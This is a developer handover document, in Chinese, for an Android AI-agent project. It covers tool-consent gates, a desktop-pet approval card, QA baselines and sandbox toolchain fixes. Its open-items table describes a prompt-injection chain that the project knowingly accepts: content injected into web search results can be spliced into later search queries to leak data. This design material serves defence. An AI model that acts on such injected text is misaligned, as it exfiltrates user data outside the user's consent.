| 技能 | `Consent.ask { … SkillNetGrant.allows(…) }` |

桌宠那一格当时是 `Deny`：价值不在「拒绝」，在于**理由进了工具结果**——用户点开桌宠会话
能看到「该操作需要用户确认，但桌宠气泡上没有审批按钮，已拒绝执行」。但那条理由说的是
「没有按钮」，而按钮是可以做的，所以有了 §3.15。

**验证**：`run-consent-verification.sh`，8 条契约 + 12 条裁决 + 1 条编译前提 = **21 条**。
A6 用行号比较盯「拒绝分支在 `tool.execute` 之前」——B 段测裁决本身，测不到分支顺序。

设计见 [`docs/architecture/Consent-契约-P1-3-2026-11-18.md`](docs/architecture/Consent-契约-P1-3-2026-11-18.md)。

### 3.15 桌宠确认卡（P1-3 第二阶段，2026-11-18 下午）

§3.14 把桌宠写成 `Consent.Deny`，代价是整个工具表被锁在四个只读工具上：
用户说「帮我打开微信」，模型只能回「我这个界面没法确认」。这一节把按钮做出来。

**四件东西**：

| 文件 | 职责 | 为什么单独一层 |
|---|---|---|
| `core/ApprovalGate.kt` | 挂起 / 超时 / 取消，四种 `Outcome` | 只依赖 coroutines，一个文件就能真编真跑 |
| `app/pet/PetApproval.kt` | 进程级状态 + 参数摘要 + 生命周期 | 要 Context / StateFlow，不能进 core |
| `PetPanel.ApprovalCard` | 一张卡：工具名 + 一句参数 + 两个按钮 | 纯渲染，状态由宿主传 |
| `app/pet/ConfirmRequiredTool.kt` | 给任意工具加「必须确认」 | 场景差异留在调用点，不改工具类 |

桌宠工具表因此多了 `app_launch`（`ConfirmRequiredTool(AppLaunchTool(ctx))`）。
选它不选写文件：桌宠的典型句子是「帮我打开微信」，用户说完就去看微信了，
这是悬浮球唯一无可替代的场景。

**三个取舍**：

1. **`cancelAll` 传 `Outcome` 而不是 `false`。** 最初实现用 `complete(false)` 解除等待，
   与「用户点拒绝」共用一个值。harness 的 B8 当天就抓到：界面销毁后等待方拿到 `DENIED`，
   工具结果写「用户拒绝了该操作」——而用户从头到尾没看见那张卡。
2. **没有「本次会话都允许」。** 那需要持久化策略表，现在没有。内存版的「本次允许」会被
   用户当成长期授权，下次点得更快。A8 盯着审批路径不许出现 `SharedPreferences`。
3. **卡片出现时自动展开气泡。** 只订阅不展开，收起态下卡片不在组合里，模型停在 45 秒
   超时，用户眼前只有一个静静待着的悬浮球。

**验证**：`run-pet-consent-verification.sh`，8 条接线 + 17 条网关 + 1 条编译前提 = **26 条**。
A 段盯「卡片真的会被画出来」——组件写好了没人调用是这类改动最常见的失败形态，
而行为 harness 证不了 Compose 渲染。真编在云端服务器做的（`BUILD SUCCESSFUL`，
AGP 8.5 / JDK 21）。

**`HeadlessPolicy` 缓做**：查过 `WorkflowWorker` 只做「到期 → 发通知」，**后台不跑 Agent**
（设计如此）。策略表现在没有任何消费者，做出来是一段没有调用方的抽象。等真有后台执行
入口时再做，那时形状也会更清楚。


## 4. 代码红线（碰了会立刻红）

| 红线 | 为什么 | 谁在守 |
|---|---|---|
| `:core` 不许 import `ui` / `tools` / Compose / `MainActivity` | 分层边界 | 编译器 + `run-arch-guard-verification.sh` |
| `arch-baseline.txt` **只减不增** | 加一条等于把已知违规合法化 | 同上。当前上限：`ChatViewModel` 3723、`ChatScreen` 3235、`RealAgentLoop` 1532 |
| `harness-baseline.txt` 只增不减（当前 **149**） | 数字变小说明有大面积 SKIP 被当成通过 | `gate.sh` 门禁 5/6 |
| 守卫裁决**不许加 Allow** | 只能拦不能放行，是这套设计唯一的安全性质 | `run-agent-seams-verification.sh` |
| 新 harness 必须「静态断言 + 自编译真跑」两段 | 只 grep 不断言行为 = 假绿 | `gate.sh` |
| 断言要数真实判据，不许为凑数写恒真断言 | `assertion-census` 会统计 | `scripts/qa/lib/` |
| 参考开源项目**只读思路，不抄代码** | 用户明确要求 | 人工评审 |

改完代码如果某个文件行数超了冻结值，**不要直接调大基线**——先问自己能不能不涨。
真必须涨，在 `arch-baseline.txt` 里写清「哪一天、因为什么、涨了多少」。

---

## 5. 环境与工具链（今天刚踩完的两个坑）

### 5.1 没有 Android SDK

本机**不能** `./gradlew assembleDebug`。验证靠两条腿：

- **CI**（GitHub Actions）做真编译；
- **本地**靠 `scripts/qa/` 里的 harness 用 `kotlinc` 自编译被测的纯 Kotlin 文件（不碰 Android 类型）。

这也是为什么新逻辑要尽量放在「零 Android 依赖」的文件里——**能自编译，才能在沙箱里真跑**。

### 5.2 坑一：CA 证书文件整个不存在

症状：`git clone/push` 报 `Failed to connect ... port 443`，`curl https://api.github.com` 返回 `000`，
但 `getent hosts` 正常、`/dev/tcp` 能建连。

根因：`/etc/ssl/certs/ca-certificates.crt` 不存在（不是过期），TLS 握手直接失败。

```bash
mkdir -p /etc/ssl/certs
cp "$(python3 -c 'import certifi;print(certifi.where())')" /etc/ssl/certs/ca-certificates.crt
```

### 5.3 坑二：自建 kotlinc 缺 `-kotlin-home`

症状：harness 的「自编译」段红成 `cannot access built-in declaration 'kotlin.Int'.
Ensure that you have a dependency on the Kotlin standard library`——看起来像代码坏了，
其实是编译器找不到自己的 stdlib。

根因：K2JVMCompiler 靠 `-kotlin-home` 定位 `lib/kotlin-stdlib.jar`；不给它，它会从
`java.class.path` 反推，推不出来，于是**只要显式传了 `-cp` 就丢 stdlib**。

修法（自建 wrapper 的 `exec` 行）：

```sh
exec java -cp "$CP" "$MAIN" -kotlin-home "$BASE" "$@"
```

配套：`$BASE/lib/` 下还要有 `kotlin-compiler.jar` 的运行期依赖（trove4j、annotations），
以及各 runner 按固定文件名找的 `kotlinx-serialization-json-jvm.jar`、
`kotlinx-serialization-core-jvm.jar`、`kotlinx-serialization-compiler-plugin.jar`。
缺插件的症状是 `plugin classpath entry points to a non-existent location: `（冒号后为空）——
看起来像语法错误，其实是 `-Xplugin=""`。

还有一处容易配错：**插件必须与编译器同一种打包**。`kotlin-compiler.jar`（非 embeddable）
配非 embeddable 的插件；`kotlin-compiler-embeddable.jar` 配 embeddable 插件。混用会得到
`NoSuchMethodError: KtClassLikeInfo.getScopeAnchor()`，栈里全在序列化插件内部，与业务无关。
最省事的做法是**缓存与 `$KC_HOME` 全部用 embeddable**——那样两处解析到的是同一个 jar，
不存在混配的可能。

### 5.4 坑三：`/usr/bin/awk` 是断链

症状：`r03` / `title-owner` / `runall` 在同一轮里一起红，日志写「ChatScreen 结构变了，
断言失效」「找不到 maybeGenerateTitle 函数体」——看起来像代码被改坏了。

根因：`/usr/bin/awk -> /etc/alternatives/awk`，而目标不存在（`mawk` 装了但 alternatives
没建链）。这些断言用 `awk '/pattern/,/^}/'` 截取代码块，awk 一失败就截出空串。

修法：`ln -sf /usr/bin/mawk /usr/bin/awk`。

### 5.5 推送

- 直连 `github.com:443` 时通时断，**单次 200 不代表大对象能传完**。判据要看三层（解析 / 单请求 / 实际传输），
  细节见 [`docs/ops/沙箱网络与GitHub通道说明.md`](docs/ops/沙箱网络与GitHub通道说明.md)。
- 写权限需要 PAT，**沙箱里不保存凭据**。`git push` 走不通时，可用 GitHub Git Data API 逐个 blob/tree/commit 上传，
  但同样需要 token。
- 注意：用 API 重建提交会让 SHA 变化。**判断「有没有传上去」要比对树对象**
  （`git rev-parse HEAD^{tree}` vs `origin/main^{tree}`），不要看 SHA。

### 5.6 坑四：沙箱清理后 45 个 runner 集体 SKIP

症状：`run-all.sh` 汇总变成 `PASS=97 SKIP=45`（当时基线是 `PASS=104 SKIP=38`；
现在是 147/0），
一个 FAIL 都没有。看起来「环境干净、一切正常」，实际是**编译型验证整体消失**——
比报红更危险，因为门禁照样绿。

根因：这些 runner 的 `[B] 行为` 段要真编真跑，靠 `scripts/qa/lib/deps.sh` 从
`$QA_GRADLE_CACHE`（默认 `~/.gradle/caches/modules-2/files-2.1`）里找
`kotlin-compiler-embeddable` / `kotlin-stdlib` / `kotlinx-coroutines-core-jvm`。
沙箱重建后这个缓存是空的，`COROUTINES` 解析为空串 → 脚本 `exit 3` 自述 SKIP。
注意 `KOTLINC/STDLIB` 有 `$KC_HOME/lib` 回落，**`COROUTINES` 没有**，所以光设
`KC_HOME=/tmp/kotlinc` 不解决问题。

修法：造一个 maven 布局的假缓存，把 `/tmp/kotlinc/lib` 的 jar 拷进去：

```bash
C=/tmp/qacache
for p in org.jetbrains.kotlin/kotlin-compiler-embeddable:kotlin-compiler-embeddable-1.9.25 \
         org.jetbrains.kotlin/kotlin-stdlib:kotlin-stdlib-1.9.25 \
         org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm:kotlinx-coroutines-core-jvm-1.8.1 \
         org.jetbrains.intellij.deps/trove4j:trove4j-1.0.20200330 \
         org.jetbrains/annotations:annotations-13.0 ; do
  d=${p%%:*}; f=${p##*:}
  mkdir -p "$C/$d"; cp -L "/tmp/kotlinc/lib/${f%%-[0-9]*}.jar" "$C/$d/$f" 2>/dev/null || true
done
# 然后：AGENTKIT_GRADLE_CACHE=/tmp/qacache bash scripts/qa/run-all.sh
```

**必须用 `cp`，不能用 `ln -s`**：`deps.sh` 里是 `find "$dir" -type f`，软链不是 `-type f`，
会被悄悄跳过——症状与「没建缓存」一模一样，白折腾一轮。（这一条是实测踩出来的。）

判据：`PASS` 回到 104 左右，且 `run-voice-arbiter-verification.sh` 的 `[B]` 段
能打出 `B1…B22` 那 22 条，而不是一行 `KS_HARNESS_SKIP`。

### 5.7 坑五：Gradle 缓存里的畸形 `h/` 目录让 84 个 runner 一起红

症状：全量汇总 `PASS=53 SKIP=1 FAIL=94`，日志里一片
`BackendException` / `NoClassDefFoundError: kotlin/reflect/jvm/ReflectJvmMapping`，
或 `module was compiled with an incompatible version of Kotlin (2.2.0, expected 1.9.0)`。

根因：`~/.gradle/caches/modules-2/files-2.1/org.jetbrains.kotlin/kotlin-compiler-embeddable/h/`
里躺着一个 2.2.21 的 jar——**版本目录名是 `h`，不是版本号**。老 harness 用
`find … | head -1` 取编译器，路径更浅的 `h/` 排在 `1.9.25/<hash>/` 前面，于是拿到的
编译器是 2.2.21、stdlib 是 1.9.23，两边对不上。

同一个坑在 `kotlin-stdlib` / `kotlinx-coroutines-core-jvm` /
`kotlinx-serialization-json-jvm` / `kotlinx-serialization-core-jvm` 各有一份。

```bash
# 先看有没有
find ~/.gradle/caches/modules-2/files-2.1 -maxdepth 3 -type d -name h
# 有就挪走（别直接删，先确认里面只有那一个 jar）
```

为什么 `deps.sh` 的 harness 不受影响：`qa_find_jar` 按 `qa_kotlin_version` 取**同版本**，
不走裸 `head -1`。约 19 个老脚本仍是裸 find——干净缓存里没事，缓存一脏就集体红。

### 5.8 坑六：沙箱重建后 `/tmp/kotlinc` 没了，7 个老 harness 报「插件路径不存在」

CI 里有一段 shim（`.github/workflows/build.yml` 的「Prepare kotlinc shim」）会在
`/tmp/kotlinc` 造一个同名 `kotlinc`，并把序列化编译器插件放到
`lib/kotlinx-serialization-compiler-plugin.jar`。沙箱不跑 CI，这段就没人做。

症状：`error: plugin classpath entry points to a non-existent location:
/tmp/kotlinc/lib/kotlinx-serialization-compiler-plugin.jar`。

修法：照 CI 那段复刻一遍即可（`KJAR/STD/TROVE/ANN` 都从缓存取，
插件从 maven central 下 `kotlin-serialization-compiler-plugin-embeddable-1.9.25.jar`）。
**插件必须与编译器同为 embeddable 变体**——非 embeddable 插件配 embeddable 编译器
会在编译期内部崩溃（exit=2）。

---

## 6. 未决事项

| 事项 | 状态 | 怎么办 |
|---|---|---|
| CI 最后一次构建结果 | **未确认**（沙箱到 `api.github.com` 时通时断） | 打开仓库 Actions 页看最新一次构建（应覆盖本轮提交） |
| 之前用过的 PAT（两个） | 待用户撤销 | 仓库与 869 个提交全扫过：**0 条真 token**，历史干净；但会话里明文出现过，仍需在 GitHub 设置里 revoke |
| 桌宠真机验证 | **模拟器已过，真机未做** | 模拟器（API 30，`-accel off`）跑通 AUTO 5 项 + 端到端链路，见 §3.12；剩下的省电策略 / 键盘 / 磁贴 / ASR 时延仍需一台 API 31 真机 + 一台国产 ROM |
| 外发守卫的残余链条 | **已知且接受** | `web_search` 刻意不标脏（连续搜索会连环弹窗，用户必然无脑点允许），代价是「搜索结果里的注入 → 再用 web_search 把内容拼进 query」这条链仍在。取舍与边界见 `docs/ops/P0-落地-2026-11-18.md` §12.8 |

**已定，不再挂在这里**（2026-11-17）：桌宠历史落盘（做了）、外发审批档位（每次问）、
P1 期间暂停新功能（冻结令）、真机机型（矩阵文档给了建议）。

---

## 7. 文档地图

| 想找什么 | 看这里 |
|---|---|
| 项目能力与文档索引 | [`README.md`](README.md) |
| 现状 · 路线图 · 踩坑记录 | `docs/architecture/AgentKit-现状与路线图-2026-10-16.md` |
| 架构为什么这么切 | `docs/architecture/AgentKit-架构方案-v2-2026-11-06.md` |
| **桌宠设计（下一步要做的事）** | [`docs/specs/desktop-pet-spec-v1.md`](docs/specs/desktop-pet-spec-v1.md) |
| 参考了谁、借了什么 | `docs/architecture/AgentKit-参照谱系-2026-11-05.md` |
| 开源项目机制调研 | `docs/research/10/11/12-*.md` |
| QA 怎么跑、门禁有哪几条 | `scripts/qa/gate.sh` 头部注释、`docs/ops/QA-GATE-CHAIN-HARDENING.md` |
| 沙箱网络 / GitHub 通道 | `docs/ops/沙箱网络与GitHub通道说明.md` |

---

## 8. 一句话给接手的人

这个项目的规矩是**先看懂、再自己写，并且每一条改动都要能被验证**。
别急着加功能——先跑一遍 §1 的三条命令，确认基线是绿的，再动第一行代码。
